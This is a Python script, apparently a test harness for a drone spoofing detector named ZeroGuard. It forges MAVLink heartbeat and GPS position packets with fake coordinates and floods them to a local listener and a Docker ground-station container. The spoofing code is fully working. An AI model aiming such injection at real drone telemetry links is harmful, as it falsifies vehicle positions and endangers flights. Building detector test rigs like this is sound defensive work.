"""
ZeroGuard GPS Spoofing Attack
Injects fake GPS MAVLink packets directly into the telemetry stream
so the ZeroGuard detector receives and flags them.
"""
from pymavlink import mavutil
from scapy.all import *
import time, sys

# ── Target: send spoofed packets to the HOST listener (ourselves)
# This simulates a MITM attack where the attacker injects into the
# MAVLink stream between drone and GCS
TARGET_IP   = "127.0.0.1"   # loopback — detector is listening here
TARGET_PORT = 14550

# Also inject into the Docker network GCS
GCS_IP   = "10.13.0.6"
GCS_PORT = 14550

# Spoofed coords — Kazakhstan (nowhere near Nevada)
FAKE_LAT = 473566100   # 47.3566 N
FAKE_LON = 854619300   # 85.4619 E

def make_mav():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav

def heartbeat():
    mav = make_mav()
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
    ).pack(mav)

def gps_raw():
    mav = make_mav()
    return mav.gps_raw_int_encode(
        time_usec=int(time.time() * 1e6),
        fix_type=3, lat=FAKE_LAT, lon=FAKE_LON,
        alt=150000, eph=100, epv=100, vel=500,
        cog=0, satellites_visible=10
    ).pack(mav)

def global_pos():
    mav = make_mav()
    return mav.global_position_int_encode(
        time_boot_ms=int(time.time()*1e3) % 4294967295,
        lat=FAKE_LAT, lon=FAKE_LON,
        alt=150000, relative_alt=150000,
        vx=0, vy=0, vz=0, hdg=0
    ).pack(mav)

def send_udp(data, ip, port):
    """Send raw UDP — works on loopback without scapy raw sockets"""
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(data, (ip, port))
    s.close()

def send_scapy(data, ip, iface):
    """Send on Docker bridge interface"""
    pkt = IP(dst=ip)/UDP(dport=GCS_PORT)/Raw(load=data)
    sendp(pkt, iface=iface, verbose=False)

IFACE = "br-2b4b5c170017"

print(f"[!] GPS SPOOFING ATTACK STARTED")
print(f"[!] Injecting fake coords: {FAKE_LAT/1e7:.4f}N, {FAKE_LON/1e7:.4f}E")
print(f"[!] → Host listener:  {TARGET_IP}:{TARGET_PORT}")
print(f"[!] → GCS container:  {GCS_IP}:{GCS_PORT}")
print(f"[!] Ctrl+C to stop\n")

count = 0
while True:
    hb  = heartbeat()
    gps = gps_raw()
    gp  = global_pos()

    # Inject into our detector's listener port
    send_udp(hb,  TARGET_IP, TARGET_PORT)
    send_udp(gps, TARGET_IP, TARGET_PORT)
    send_udp(gp,  TARGET_IP, TARGET_PORT)

    # Also inject into Docker network
    try:
        send_scapy(hb,  GCS_IP, IFACE)
        send_scapy(gps, GCS_IP, IFACE)
        send_scapy(gp,  GCS_IP, IFACE)
    except Exception:
        pass  # scapy optional — UDP injection is what matters

    count += 1
    print(f"\r[+] Injected {count} spoofed packet bursts", end="", flush=True)
    time.sleep(0.3)